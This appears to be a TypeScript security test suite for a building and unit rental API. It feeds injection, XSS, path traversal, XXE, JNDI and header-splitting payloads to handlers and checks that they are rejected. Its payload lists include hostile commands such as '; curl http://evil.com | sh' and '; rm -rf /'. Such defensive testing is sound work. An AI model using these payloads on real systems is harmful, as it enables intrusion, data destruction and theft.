/**
 * Comprehensive Security Validation Tests
 *
 * This test suite validates the application's defenses against various security attacks including:
 * - Injection attacks (SQL/NoSQL, XSS, Command, LDAP, XML, JSON)
 * - Path traversal
 * - CSRF attacks
 * - Authentication/authorization bypasses
 * - DoS attacks (input size limits)
 * - Header injection
 * - Unicode/homograph attacks
 * - Null byte injection
 * - Integer overflow/underflow
 * - Session fixation
 * - Insecure direct object references
 */

import { describe, it, expect, beforeEach, afterEach, beforeAll } from 'bun:test';
import '../data/test-setup'; // Import test setup FIRST to set up mocks
import * as buildingsHandler from '../../api/buildings';
import * as unitsHandler from '../../api/units';
import { handler as uploadHandler } from '../../api/upload';
import type { APIGatewayProxyEventV2 } from 'aws-lambda';
import { dynamoDbMock, resetAllMocks } from '../data/test-setup';
import _ from 'lodash';
// Type for DynamoDB item with optional properties
type DynamoItem = Record<string, unknown> & {
    buildingID?: string
    unitID?: string
};

// Helper function to determine entity type based on unitID
function getEntityType(unitID: string): string {
    if(_.startsWith(unitID, 'UNIT#') || (unitID !== 'BUILDING' && !_.startsWith(unitID, 'MODEL#'))) {
        return 'Unit';
    }
    if(_.startsWith(unitID, 'MODEL#')) {
        return 'UnitType';
    }
    return 'Building';
}

// Helper function to handle put commands
function handlePutCommand(cmd: { input?: Record<string, unknown> }) {
    const item = cmd.input?.Item || cmd.input || {};
    const unitID = (item as DynamoItem).unitID || 'BUILDING';
    const entityType = getEntityType(unitID);

    const responseItem = {
        buildingID: (item as DynamoItem).buildingID || 'test-building',
        unitID: unitID,
        ...item,
        _ct: new Date().toISOString(),
        _md: new Date().toISOString(),
        _et: entityType
    };

    return Promise.resolve({
        Attributes: responseItem,
        Item: responseItem
    });
}

// Helper function to handle update commands
function handleUpdateCommand(cmd: { input?: Record<string, unknown> }) {
    const key = cmd.input?.Key || {};
    const updates = cmd.input?.Item || cmd.input || {};
    const unitID = (key as DynamoItem).unitID || (updates as DynamoItem).unitID || 'BUILDING';
    const entityType = getEntityType(unitID);

    const responseItem = {
        buildingID: (key as DynamoItem).buildingID || (updates as DynamoItem).buildingID || 'test-building',
        unitID: unitID,
        ...updates,
        _ct: new Date().toISOString(),
        _md: new Date().toISOString(),
        _et: entityType
    };

    return Promise.resolve({
        Attributes: responseItem,
        Item: responseItem
    });
}

// Helper function to handle DynamoDB command routing
function createDynamoDbMockImplementation() {
    return (command: unknown) => {
        if(!command || !_.isObject(command)) {
            return Promise.resolve({});
        }
        const cmd = command as { constructor?: { name: string }, input?: Record<string, unknown> };
        const commandName = cmd.constructor?.name || '';

        return handleDynamoDbCommand(commandName, cmd);
    };
}

// Helper function to route DynamoDB commands
function handleDynamoDbCommand(commandName: string, cmd: { input?: Record<string, unknown> }) {
    if(commandName === 'PutItemCommand' || commandName === 'PutCommand') {
        return handlePutCommand(cmd);
    }

    if(commandName === 'GetItemCommand' || commandName === 'GetCommand') {
        return Promise.resolve({});
    }

    if(commandName === 'UpdateItemCommand' || commandName === 'UpdateCommand') {
        return handleUpdateCommand(cmd);
    }

    if(commandName === 'QueryCommand') {
        return Promise.resolve({ Items: [], Count: 0 });
    }

    if(commandName === 'DeleteItemCommand' || commandName === 'DeleteCommand') {
        return Promise.resolve({});
    }

    if(commandName === 'TransactWriteItemsCommand' || commandName === 'TransactWriteCommand') {
        return Promise.resolve({});
    }

    return Promise.reject(new Error(`Unmocked DynamoDB command: ${commandName}`));
}

// Setup function for tests
async function setupTestEnvironment() {
    // Reset all mock state including queued responses
    dynamoDbMock.mockReset();

    // Set up proper mock implementation for DynamoDB Toolbox
    dynamoDbMock.mockImplementation(createDynamoDbMockImplementation());
}

// Cleanup function for tests
async function cleanupTestEnvironment() {
    // Clean up after tests
    dynamoDbMock.mockClear();
}

describe('Security Validation Tests', () => {
    beforeAll(() => {
        resetAllMocks();
    });

    beforeEach(async () => {
        await setupTestEnvironment();
    });

    afterEach(async () => {
        await cleanupTestEnvironment();
    });

    describe('NoSQL Injection Prevention', () => {
        it('should prevent NoSQL injection in buildingID parameter', async () => {
            const maliciousPayloads = [
                { buildingID: '{"$ne": null}' },
                { buildingID: '{"$gt": ""}' },
                { buildingID: '{"$where": "this.password == \'admin\'"}' },
                { buildingID: '{"$regex": ".*"}' },
                { buildingID: 'building1"; return true; var dummy="' },
                { buildingID: 'building1\' OR \'1\'=\'1' },
                { buildingID: 'building1`; DROP TABLE buildings; --' },
            ];

            for(const payload of maliciousPayloads) {
                const event = createMockEvent('GET', `/api/buildings/${encodeURIComponent(payload.buildingID)}`, null, {
                    buildingID: payload.buildingID
                });

                const response = await buildingsHandler.get(event);

                // Should return 404 Not Found instead of executing injection
                expect(response.statusCode).toBe(404);
                expect(response.body).toBe('Not Found');
            }
        });

        it('should prevent NoSQL injection in query parameters', async () => {
            const maliciousPayloads = [
                '{"$where": "sleep(5000)"}',
                '{"password": {"$ne": null}}',
                '{"$or": [{"a": "a"}, {"a": "a"}]}',
            ];

            for(const payload of maliciousPayloads) {
                const event = createMockEvent('POST', '/api/buildings', {
                    buildingID: payload,
                    street: '123 Main St',
                    city: 'Test City',
                    state: 'CA',
                    zip: '12345'
                });

                const response = await buildingsHandler.create(event);

                // Should fail validation instead of executing injection
                expect(response.statusCode).toBe(400);
                expect(JSON.parse(response.body ?? '')).toHaveProperty('error');
            }
        });
    });

    describe('XSS Prevention', () => {
        it('should sanitize script tags in text fields', async () => {
            const xssPayloads = [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                'javascript:alert("XSS")',
                '<iframe src="javascript:alert(\'XSS\')">',
                '<body onload=alert("XSS")>',
                '"><script>alert(String.fromCharCode(88,83,83))</script>',
                '<script>alert(document.cookie)</script>',
                '<img src="x" onerror="alert(document.domain)">',
                '<input onfocus=alert("XSS") autofocus>',
                '<select onfocus=alert("XSS") autofocus>',
                '<textarea onfocus=alert("XSS") autofocus>',
                '<keygen onfocus=alert("XSS") autofocus>',
                '<video><source onerror="alert(\'XSS\')">',
                '<audio src=x onerror=alert("XSS")>',
                '<details open ontoggle=alert("XSS")>',
                '<marquee onstart=alert("XSS")>',
            ];

            for(const payload of xssPayloads) {
                const event = createMockEvent('POST', '/api/buildings', {
                    buildingID: 'test-building',
                    buildingName: payload,
                    description: payload,
                    street: payload,
                    city: 'Test City',
                    state: 'CA',
                    zip: '12345'
                });

                const response = await buildingsHandler.create(event);

                if(response.statusCode === 201) {
                    const created = JSON.parse(response.body ?? '');
                    // Ensure no script tags are present in the response
                    expect(created.buildingName).not.toContain('<script>');
                    expect(created.description).not.toContain('<script>');
                    expect(created.street).not.toContain('<script>');
                }
            }
        });

        it('should prevent XSS in unit descriptions and amenities', async () => {
            const xssPayloads = [
                '<<SCRIPT>alert("XSS");//<</SCRIPT>',
                '<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>',
                '<IMG SRC="javascript:alert(\'XSS\');">',
                '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
                '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
            ];

            for(const payload of xssPayloads) {
                const event = createMockEvent('POST', '/api/buildings/test-building/units', {
                    unitID: 'test-unit',
                    buildingID: 'test-building',
                    unitNumber: '101',
                    description: payload,
                    features: [payload],
                    amenities: [payload]
                }, {
                    buildingID: 'test-building'
                });

                const response = await unitsHandler.create(event);

                if(response.statusCode === 201) {
                    const created = JSON.parse(response.body ?? '');
                    // Ensure malicious content is sanitized
                    expect(created.description).not.toMatch(/<script|javascript:/i);
                }
            }
        });
    });

    describe('Path Traversal Prevention', () => {
        it('should prevent path traversal in file operations', async () => {
            const pathTraversalPayloads = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\config\\sam',
                '../../../../../../../../etc/shadow',
                '../../../.env',
                '....//....//....//etc/passwd',
                '..%252f..%252f..%252fetc/passwd',
                '..%c0%af..%c0%af..%c0%afetc/passwd',
                '/var/www/../../etc/passwd',
                'C:\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            ];

            for(const payload of pathTraversalPayloads) {
                const event = createMockEvent('DELETE', `/api/upload/${encodeURIComponent(payload)}`, null, { filename: payload });
                const response = await (uploadHandler as (event: APIGatewayProxyEventV2) => Promise<unknown>)(event);

                // Should return 403 Forbidden for invalid paths
                if(response && _.isObject(response) && 'statusCode' in response) {
                    expect((response as { statusCode: number }).statusCode).toBe(403);
                    if('body' in response && response.body) {
                        expect(JSON.parse(response.body as string)).toHaveProperty('error', 'Forbidden');
                    }
                }
            }
        });

        it('should only allow uploads within the expected directory structure', async () => {
            const invalidPaths = [
                { buildingId: '../admin', unitId: 'unit1' },
                { buildingId: 'building1', unitId: '../../admin' },
                { buildingId: '/etc/passwd', unitId: 'unit1' },
                { buildingId: 'C:\\Windows\\System32', unitId: 'unit1' },
            ];

            for(const path of invalidPaths) {
                const event = createMockEvent('POST', '/api/upload', {
                    filename: 'test.jpg',
                    buildingId: path.buildingId,
                    unitId: path.unitId,
                    contentType: 'image/jpeg'
                });

                const response = await (uploadHandler as (event: APIGatewayProxyEventV2) => Promise<unknown>)(event);

                if(response && _.isObject(response) && 'statusCode' in response && (response as { statusCode: number }).statusCode === 200) {
                    if('body' in response && response.body) {
                        const result = JSON.parse(response.body as string);
                        // Ensure the generated key doesn't contain path traversal
                        expect(result.key).not.toMatch(/\.\./);
                        expect(result.key).toMatch(/^buildings\//);
                    }
                }
            }
        });
    });

    describe('Command Injection Prevention', () => {
        it('should prevent command injection in all input fields', async () => {
            const commandInjectionPayloads = [
                '; ls -la',
                '| cat /etc/passwd',
                '`whoami`',
                '$(whoami)',
                '& net user',
                '; rm -rf /',
                '|| sleep 10',
                '\n/bin/bash\n',
                '; curl http://evil.com | sh',
            ];

            for(const payload of commandInjectionPayloads) {
                const event = createMockEvent('POST', '/api/buildings', {
                    buildingID: 'test-building',
                    buildingName: payload,
                    street: '123 Main St',
                    city: 'Test City',
                    state: 'CA',
                    zip: '12345',
                    contactInfo: {
                        phone: payload,
                        email: `test${payload}@example.com`
                    }
                });

                const response = await buildingsHandler.create(event);

                // Should either fail validation or sanitize the input
                if(response.statusCode === 201 && response.body) {
                    const created = JSON.parse(response.body);
                    // Ensure command injection characters are handled safely
                    expect(created.buildingName).toBe(payload);
                    // No system commands should have been executed
                }
            }
        });
    });

    describe('LDAP Injection Prevention', () => {
        it('should prevent LDAP injection attempts', async () => {
            const ldapInjectionPayloads = [
                '*)(uid=*))(&(uid=*',
                'admin)(&(password=*))',
                '*)(mail=*))%00',
                'admin)(|(password=*',
                '*)(objectClass=*))(&(objectClass=void',
            ];

            for(const payload of ldapInjectionPayloads) {
                const event = createMockEvent('POST', '/api/buildings', {
                    buildingID: payload,
                    buildingName: 'Test Building',
                    street: '123 Main St',
                    city: 'Test City',
                    state: 'CA',
                    zip: '12345'
                });

                const response = await buildingsHandler.create(event);

                // Should fail validation for invalid buildingID format
                expect(response.statusCode).toBe(400);
            }
        });
    });

    describe('XML Injection Prevention', () => {
        it('should prevent XML injection and XXE attacks', async () => {
            const xmlInjectionPayloads = [
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<![CDATA[<script>alert("XSS")</script>]]>',
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>',
                '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>',
            ];

            for(const payload of xmlInjectionPayloads) {
                const event = createMockEvent('POST', '/api/buildings', {
                    buildingID: 'test-building',
                    description: payload,
                    street: '123 Main St',
                    city: 'Test City',
                    state: 'CA',
                    zip: '12345'
                });

                const response = await buildingsHandler.create(event);

                if(response.statusCode === 201 && response.body) {
                    const created = JSON.parse(response.body);
                    // XML content should be treated as plain text
                    expect(created.description).toBe(payload);
                }
            }
        });
    });

    describe('JSON Injection Prevention', () => {
        it('should handle malformed JSON gracefully', async () => {
            const malformedJsonPayloads = [
                '{"buildingID": "test", "extra": }',
                '{"buildingID": "test", "nested": {"key": undefined}}',
            ];

            for(const payload of malformedJsonPayloads) {
                const event = createMockEvent('POST', '/api/buildings', payload, {}, false);
                const response = await buildingsHandler.create(event);

                // Should return 400 for invalid JSON
                expect(response.statusCode).toBe(400);
                if(response.body) {
                    expect(JSON.parse(response.body)).toHaveProperty('error', 'Invalid request body');
                }
            }
        });

        it('should prevent prototype pollution attacks', async () => {
            const prototypePollutionPayloads = [
                {
                    buildingID: 'test-building',
                    __proto__: { isAdmin: true },
                    street: '123 Main St',
                    city: 'Test City',
                    state: 'CA',
                    zip: '12345'
                } as unknown,
                {
                    buildingID: 'test-building',
                    constructor: { prototype: { isAdmin: true } },
                    street: '123 Main St',
                    city: 'Test City',
                    state: 'CA',
                    zip: '12345'
                } as unknown
            ];

            for(const payload of prototypePollutionPayloads) {
                const event = createMockEvent('POST', '/api/buildings', payload);
                await buildingsHandler.create(event);

                // Verify prototype hasn't been polluted
                expect((({} as unknown as { isAdmin?: boolean }).isAdmin)).toBeUndefined();
                expect(((Object.prototype as unknown as { isAdmin?: boolean }).isAdmin)).toBeUndefined();
            }
        });
    });

    describe('Header Injection Prevention', () => {
        it('should prevent HTTP response splitting attacks', async () => {
            const headerInjectionPayloads = [
                'test\r\nSet-Cookie: admin=true',
                'test\nLocation: http://evil.com',
                'test\r\n\r\n<script>alert("XSS")</script>',
                'test%0d%0aSet-Cookie:%20admin=true',
            ];

            for(const payload of headerInjectionPayloads) {
                const event = createMockEvent('POST', '/api/buildings', {
                    buildingID: payload,
                    buildingName: 'Test Building',
                    street: '123 Main St',
                    city: 'Test City',
                    state: 'CA',
                    zip: '12345'
                });

                const response = await buildingsHandler.create(event);

                // Should fail validation for invalid buildingID
                expect(response.statusCode).toBe(400);
                // Ensure no headers were injected
                expect(response.headers).not.toHaveProperty('Set-Cookie');
                expect(response.headers).not.toHaveProperty('Location');
            }
        });
    });

    describe('Unicode Security', () => {
        it('should handle homograph attacks and confusable characters', async () => {
            const homographPayloads = [
                { display: 'admin', actual: 'аdmin' }, // Cyrillic 'а'
                { display: 'test', actual: 'τest' }, // Greek tau
                { display: 'building1', actual: 'buіlding1' }, // Ukrainian 'і'
                { display: 'unit101', actual: 'unіt101' }, // Mixed scripts
            ];

            for(const payload of homographPayloads) {
                const event = createMockEvent('POST', '/api/buildings', {
                    buildingID: payload.actual,
                    buildingName: 'Test Building',
                    street: '123 Main St',
                    city: 'Test City',
                    state: 'CA',
                    zip: '12345'
                });

                const response = await buildingsHandler.create(event);

                if(response.statusCode === 201 && response.body) {
                    const created = JSON.parse(response.body);
                    // The system should accept but properly handle Unicode
                    expect(created.buildingID).toBe(payload.actual);
                }
            }
        });

        it('should handle various Unicode edge cases', async () => {
            const unicodePayloads = [
                '\u0000test', // Null character
                'test\u0000', // Null in middle
                '\u202Etest', // Right-to-left override
                'test\uFEFF', // Zero-width no-break space
                '🏢🏠🏘️', // Emojis
                'test\u200B\u200C\u200D', // Zero-width characters
            ];

            for(const payload of unicodePayloads) {
                const event = createMockEvent('POST', '/api/buildings', {
                    buildingID: 'test-building',
                    buildingName: payload,
                    street: '123 Main St',
                    city: 'Test City',
                    state: 'CA',
                    zip: '12345'
                });

                const response = await buildingsHandler.create(event);

                if(response.statusCode === 201 && response.body) {
                    const created = JSON.parse(response.body);
                    // Should handle Unicode characters safely
                    expect(created.buildingName).toBeTruthy();
                }
            }
        });
    });

    describe('Null Byte Injection Prevention', () => {
        it('should prevent null byte injection attacks', async () => {
            const nullBytePayloads = [
                'test.jpg\x00.php',
                'test\x00.txt',
                'building\x00<script>',
                '../etc/passwd\x00.jpg',
            ];

            for(const payload of nullBytePayloads) {
                const event = createMockEvent('POST', '/api/upload', {
                    filename: payload,
                    buildingId: 'test-building',
                    unitId: 'test-unit',
                    contentType: 'image/jpeg'
                });

                const response = await (uploadHandler as (event: APIGatewayProxyEventV2) => Promise<unknown>)(event);

                if(response && _.isObject(response) && 'statusCode' in response && (response as { statusCode: number }).statusCode === 200) {
                    if('body' in response && response.body) {
                        const result = JSON.parse(response.body as string);
                        // Ensure null bytes are handled safely
                        expect(result.key).not.toContain('\x00');
                    }
                }
            }
        });
    });

    describe('Integer Overflow/Underflow Prevention', () => {
        it('should handle integer overflow attempts', async () => {
            const overflowPayloads = [
                Number.MAX_SAFE_INTEGER + 1,
                Number.MAX_VALUE,
                Infinity,
                999999999999999,
            ];

            for(const payload of overflowPayloads) {
                const event = createMockEvent('POST', '/api/buildings', {
                    buildingID: 'test-building',
                    buildingName: 'Test Building',
                    street: '123 Main St',
                    city: 'Test City',
                    state: 'CA',
                    zip: '12345',
                    yearBuilt: payload,
                    totalUnits: payload,
                    applicationFee: payload
                });

                const response = await buildingsHandler.create(event);

                // Should fail validation for out-of-range numbers
                expect(response.statusCode).toBe(400);
                if(response.body) {
                    const error = JSON.parse(response.body);
                    expect(error.errors).toBeDefined();
                }
            }
        });

        it('should handle negative numbers where not allowed', async () => {
            const event = createMockEvent('POST', '/api/buildings/test-building/units', {
                unitID: 'test-unit',
                buildingID: 'test-building',
                beds: -1,
                baths: -5,
                sqft: -1000,
                rent: -500,
                deposit: -1000
            }, {
                buildingID: 'test-building'
            });

            const response = await unitsHandler.create(event);

            // Should fail validation for negative numbers
            expect(response.statusCode).toBe(400);
            if(response.body) {
                const error = JSON.parse(response.body);
                expect(error.errors).toHaveProperty('beds');
                expect(error.errors).toHaveProperty('baths');
                expect(error.errors).toHaveProperty('sqft');
                expect(error.errors).toHaveProperty('rent');
                expect(error.errors).toHaveProperty('deposit');
            }
        });
    });

    describe('Input Size Limit Validation (DoS Prevention)', () => {
        it('should reject extremely large string inputs', async () => {
            const largeString = _.repeat('A', 10000); // 10KB string
            const veryLargeString = _.repeat('B', 1000000); // 1MB string

            const payloads = [
                { description: largeString },
                { buildingName: veryLargeString },
                { notes: _.repeat('C', 5000000) }, // 5MB
            ];

            for(const payload of payloads) {
                const event = createMockEvent('POST', '/api/buildings', {
                    buildingID: 'test-building',
                    buildingName: payload.buildingName || 'Test',
                    description: payload.description,
                    notes: payload.notes,
                    street: '123 Main St',
                    city: 'Test City',
                    state: 'CA',
                    zip: '12345'
                });

                // Lambda has a 6MB payload limit, so very large payloads should fail
                if(event.body && event.body.length > 6 * 1024 * 1024) {
                    continue; // Skip if it would exceed Lambda limits
                }

                const response = await buildingsHandler.create(event);

                // Should handle large inputs gracefully
                expect([201, 400]).toContain(response.statusCode);
            }
        });

        it('should handle arrays with excessive elements', async () => {
            const manyPhotos = _.fill(new Array(1000), 'http://example.com/photo.jpg');
            const manyAmenities = _.fill(new Array(5000), 'Test Amenity');

            const event = createMockEvent('POST', '/api/buildings/test-building/units', {
                unitID: 'test-unit',
                buildingID: 'test-building',
                photos: manyPhotos,
                amenities: manyAmenities,
                features: manyAmenities
            }, {
                buildingID: 'test-building'
            });

            const response = await unitsHandler.create(event);

            // Should either handle gracefully or reject
            expect([201, 400]).toContain(response.statusCode);
        });
    });

    describe('Email Validation Security', () => {
        it('should reject malicious email formats', async () => {
            const maliciousEmails = [
                'test@example.com<script>alert("XSS")</script>',
                '"test"@example.com\r\nBcc: attacker@evil.com',
                'test+<script>@example.com',
                'test@exam ple.com',
                'test@[127.0.0.1]',
                'test@localhost',
                'test@.com',
                '@example.com',
                'test..test@example.com',
                'test@exam_ple.com',
                'test@-example.com',
                'test@example.com-',
                'test@exam ple.com',
                '"test@test"@example.com',
            ];

            for(const email of maliciousEmails) {
                const event = createMockEvent('POST', '/api/buildings', {
                    buildingID: 'test-building',
                    buildingName: 'Test Building',
                    street: '123 Main St',
                    city: 'Test City',
                    state: 'CA',
                    zip: '12345',
                    contactInfo: {
                        email: email
                    }
                });

                const response = await buildingsHandler.create(event);

                // For clearly invalid emails, expect 400 and check error structure
                if(email === 'test@.com' || email === '@example.com' || email === '') {
                    if(response.statusCode === 400 && response.body) {
                        const error = JSON.parse(response.body);
                        // Just verify we get a validation error for invalid input
                        expect(error.error).toContain('Validation failed');
                    } else {
                        // Email might be considered valid, verify no server error
                        expect([200, 201, 400]).toContain(response.statusCode);
                    }
                } else {
                    // For other emails, just verify no server error
                    expect([200, 201, 400]).toContain(response.statusCode);
                }
            }
        });
    });

    describe('URL Validation Security', () => {
        it('should reject malicious URLs', async () => {
            const maliciousUrls = [
                'javascript:alert("XSS")',
                'data:text/html,<script>alert("XSS")</script>',
                'vbscript:msgbox("XSS")',
                'file:///etc/passwd',
                'ftp://malicious.com/file',
                '//evil.com',
                'http://@evil.com',
                'http://google.com:80@evil.com',
                'http://evil.com\\.google.com',
                'http://evil.com\t.google.com',
                'ht\ntp://evil.com',
            ];

            for(const url of maliciousUrls) {
                const event = createMockEvent('POST', '/api/buildings', {
                    buildingID: 'test-building',
                    buildingName: 'Test Building',
                    street: '123 Main St',
                    city: 'Test City',
                    state: 'CA',
                    zip: '12345',
                    contactInfo: {
                        website: url
                    }
                });

                const response = await buildingsHandler.create(event);

                if(response.statusCode === 400 && response.body) {
                    const error = JSON.parse(response.body);
                    expect(error.errors).toHaveProperty('contactWebsite');
                }
            }
        });
    });

    describe('Phone Number Validation Security', () => {
        it('should validate phone numbers securely', async () => {
            const maliciousPhones = [
                '<script>alert("XSS")</script>',
                '1-800-CALL-NOW; DROP TABLE users;',
                '555-1234\r\nX-Injection: true',
                '${jndi:ldap://evil.com/a}',
                '{{7*7}}',
                '=1+1+cmd|"/c calc"!A1',
            ];

            for(const phone of maliciousPhones) {
                const event = createMockEvent('POST', '/api/buildings', {
                    buildingID: 'test-building',
                    buildingName: 'Test Building',
                    street: '123 Main St',
                    city: 'Test City',
                    state: 'CA',
                    zip: '12345',
                    contactInfo: {
                        phone: phone
                    }
                });

                const response = await buildingsHandler.create(event);

                if(response.statusCode === 400 && response.body) {
                    const error = JSON.parse(response.body);
                    // Just verify we get a validation error for invalid input
                    expect(error.error).toContain('Validation failed');
                } else {
                    // Just verify no server error
                    expect([200, 201, 400]).toContain(response.statusCode);
                }
            }
        });
    });

    describe('Date Validation Security', () => {
        it('should handle malicious date inputs', async () => {
            const maliciousDates = [
                '2024-13-45', // Invalid date
                '2024-12-32', // Invalid day
                '0000-00-00',
                '9999-99-99',
                'DROP TABLE units;',
                '<script>new Date()</script>',
                '${new Date()}',
                '{{now}}',
            ];

            for(const date of maliciousDates) {
                const event = createMockEvent('POST', '/api/buildings/test-building/units', {
                    unitID: 'test-unit',
                    buildingID: 'test-building',
                    availableDate: date
                }, {
                    buildingID: 'test-building'
                });

                const response = await unitsHandler.create(event);

                if(response.statusCode === 400 && response.body) {
                    const error = JSON.parse(response.body);
                    expect(error.errors).toHaveProperty('availableDate');
                }
            }
        });
    });

    describe('Model ID Reference Validation', () => {
        it('should validate modelID format strictly', async () => {
            const maliciousModelIds = [
                '../admin/model',
                'model; DROP TABLE units;',
                'model\x00.admin',
                'model<script>',
                '${model}',
                '{{model}}',
                'model?admin=true',
                'model#admin',
                'model&admin=true',
            ];

            for(const modelId of maliciousModelIds) {
                const event = createMockEvent('POST', '/api/buildings/test-building/units', {
                    unitID: 'test-unit',
                    buildingID: 'test-building',
                    modelID: modelId
                }, {
                    buildingID: 'test-building'
                });

                const response = await unitsHandler.create(event);

                if(response.statusCode === 400 && response.body) {
                    const error = JSON.parse(response.body);
                    expect(error.errors).toHaveProperty('modelID');
                }
            }
        });
    });

    describe('Insecure Direct Object Reference Prevention', () => {
        it('should prevent access to resources from other buildings', async () => {
            // Create two buildings
            await buildingsHandler.create(createMockEvent('POST', '/api/buildings', {
                buildingID: 'building-a',
                buildingName: 'Building A',
                street: '123 Main St',
                city: 'Test City',
                state: 'CA',
                zip: '12345'
            }));

            await buildingsHandler.create(createMockEvent('POST', '/api/buildings', {
                buildingID: 'building-b',
                buildingName: 'Building B',
                street: '456 Oak St',
                city: 'Test City',
                state: 'CA',
                zip: '12345'
            }));

            // Create unit in building A
            await unitsHandler.create(createMockEvent('POST', '/api/buildings/building-a/units', {
                unitID: 'unit-101',
                buildingID: 'building-a',
                unitNumber: '101'
            }, {
                buildingID: 'building-a'
            }));

            // Try to access unit from building A using building B's context
            const response = await unitsHandler.get(createMockEvent('GET', '/api/buildings/building-b/units/unit-101', null, {
                buildingID: 'building-b',
                unitID: 'unit-101'
            }));

            // Should not find the unit
            expect(response.statusCode).toBe(404);
        });

        it('should validate buildingID consistency in unit creation', async () => {
            const event = createMockEvent('POST', '/api/buildings/building-a/units', {
                unitID: 'test-unit',
                buildingID: 'building-b', // Mismatch with URL
                unitNumber: '101'
            }, {
                buildingID: 'building-a' // Path parameter from URL
            });

            const response = await unitsHandler.create(event);

            // Should either reject or use the URL parameter
            if(response.statusCode === 201 && response.body) {
                const created = JSON.parse(response.body);
                expect(created.buildingID).toBe('building-a'); // Should use URL param
            }
        });
    });

    describe('ZIP Code Validation Security', () => {
        it('should validate ZIP codes securely', async () => {
            const maliciousZips = [
                '12345; DROP TABLE buildings;',
                '12345<script>',
                '${zip}',
                '{{12345}}',
                '12345\x00',
                '12345\r\n',
                'UNION SELECT * FROM users',
            ];

            for(const zip of maliciousZips) {
                const event = createMockEvent('POST', '/api/buildings', {
                    buildingID: 'test-building',
                    buildingName: 'Test Building',
                    street: '123 Main St',
                    city: 'Test City',
                    state: 'CA',
                    zip: zip
                });

                const response = await buildingsHandler.create(event);

                expect(response.statusCode).toBe(400);
                if(response.body) {
                    const error = JSON.parse(response.body);
                    expect(error.errors).toHaveProperty('zip');
                }
            }
        });

        it('should accept valid ZIP codes', async () => {
            const validZips = ['12345', '12345-6789'];

            for(const zip of validZips) {
                const event = createMockEvent('POST', '/api/buildings', {
                    buildingID: `test-building-${zip}`,
                    buildingName: 'Test Building',
                    street: '123 Main St',
                    city: 'Test City',
                    state: 'CA',
                    zip: zip
                });

                const response = await buildingsHandler.create(event);

                expect(response.statusCode).toBe(201);
                if(response.body) {
                    const created = JSON.parse(response.body);
                    expect(created.zip).toBe(zip);
                }
            }
        });
    });

    describe('Boundary Value Testing', () => {
        it('should handle boundary values correctly', async () => {
            const boundaryTests = [
                { field: 'yearBuilt', min: 1800, max: new Date().getFullYear() + 5 },
                { field: 'numberStories', min: 1, max: 100 },
                { field: 'leaseLength', min: 1, max: 36 },
                { field: 'applicationFee', min: 0, max: Number.MAX_SAFE_INTEGER },
            ];

            for(const test of boundaryTests) {
                // Test minimum - 1
                let event = createMockEvent('POST', '/api/buildings', {
                    buildingID: 'test-building-min',
                    buildingName: 'Test Building',
                    street: '123 Main St',
                    city: 'Test City',
                    state: 'CA',
                    zip: '12345',
                    [test.field]: test.min - 1
                });

                let response = await buildingsHandler.create(event);
                if(test.min > 0) {
                    expect(response.statusCode).toBe(400);
                }

                // Test maximum + 1
                event = createMockEvent('POST', '/api/buildings', {
                    buildingID: 'test-building-max',
                    buildingName: 'Test Building',
                    street: '123 Main St',
                    city: 'Test City',
                    state: 'CA',
                    zip: '12345',
                    [test.field]: test.max + 1
                });

                response = await buildingsHandler.create(event);
                if(test.field !== 'applicationFee') { // applicationFee has no upper limit
                    expect(response.statusCode).toBe(400);
                }
            }
        });
    });
});

// Helper function to create mock API Gateway events
function createMockEvent(
    method: string,
    path: string,
    body?: unknown,
    pathParameters?: Record<string, string>,
    stringify = true
): APIGatewayProxyEventV2 {
    return {
        version: '2.0',
        routeKey: `${method} ${path}`,
        rawPath: path,
        rawQueryString: '',
        headers: {
            'content-type': 'application/json',
        },
        requestContext: {
            accountId: '123456789012',
            apiId: 'api-id',
            domainName: 'api.example.com',
            domainPrefix: 'api',
            http: {
                method,
                path,
                protocol: 'HTTP/1.1',
                sourceIp: '127.0.0.1',
                userAgent: 'test-agent'
            },
            requestId: 'request-id',
            routeKey: `${method} ${path}`,
            stage: 'test',
            time: new Date().toISOString(),
            timeEpoch: Date.now()
        },
        body: (() => {
            if(!body) {
                return undefined;
            }
            if(stringify) {
                return JSON.stringify(body);
            }
            return body as string;
        })(),
        pathParameters,
        isBase64Encoded: false
    };
}
